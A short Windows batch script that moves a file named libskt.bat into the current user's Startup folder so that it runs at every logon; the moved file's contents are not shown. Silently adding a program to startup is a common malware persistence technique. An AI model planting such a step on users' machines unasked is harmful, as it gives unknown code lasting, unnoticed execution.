@echo off
for %%A in (%USERNAME%) do (
move libskt.bat "C:\Users\%%A\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

)

exit
